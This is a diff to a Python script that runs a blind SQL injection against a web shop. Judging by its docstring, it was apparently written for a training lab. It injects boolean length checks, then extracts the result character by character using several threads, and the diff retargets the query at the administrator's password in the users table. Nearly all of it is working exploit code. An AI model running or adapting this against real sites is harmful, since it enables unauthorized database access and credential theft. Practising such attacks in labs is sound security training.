@@ -1,3 +1,6 @@
+"""
+This is not script for automatization solve lab, but he give you password
+"""
 import sys
 import logging
 import urllib3
@@ -29,6 +32,7 @@ string.printable
 #Out[2]: '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c' 
 AVAIL_CHARS = string.printable 
 #и переменная avail_char (доступные символы хранит в себе подобный response)
+MAX_LENGTH = 100
 def format_length_query(inner_query, length):
     return f"xyz' or (select length(({inner_query}))={length})-- "
 
@@ -55,7 +59,7 @@ def format_request(url, outer_query):
 def determine_response_length(inner_query, url, no_proxy=False):
     log.info("determinging response length")
     sess = requests.Session()
-    for i in range(1, 5):
+    for i in range(1, MAX_LENGTH):
         outer_query = format_length_query(inner_query, i)
         prepped = format_request(url, outer_query)
         if no_proxy:
@@ -100,6 +104,11 @@ def format_results(response_chars):
 
 def get_response_string(inner_query, url, no_proxy, num_threads):
     response_lenght = determine_response_length(inner_query, url, no_proxy) #here
+    if response_lenght is None:
+        log.error("Couldn't determine response length.")
+        sys.exit()
+    if num_threads > response_lenght:
+        num_threads = response_lenght
     tasks = []
     for i in range(1, response_lenght + 1):
         result = {
@@ -117,15 +126,14 @@ def get_response_string(inner_query, url, no_proxy, num_threads):
     return format_results(response_chars)       
 
 def main(args):
-    num_threads = 1
+    num_threads = 8
     sess = requests.Session()
     shop = Shop(args.url, args.no_proxy, sess)
-    inner_query = "SELECT 'abcd'"
-    response_string = get_response_string(
+    inner_query = "SELECT password from users where username = 'administrator'"
+    respone_string = get_response_string(
         inner_query, shop.base_url, shop.no_proxy, num_threads
         )
-    log.info(f"Response is: {response_string}")
-    
+    log.info(f"Response is: {respone_string}")
     
 if __name__ == "__main__":
     args = utils.parse_args(sys.argv)
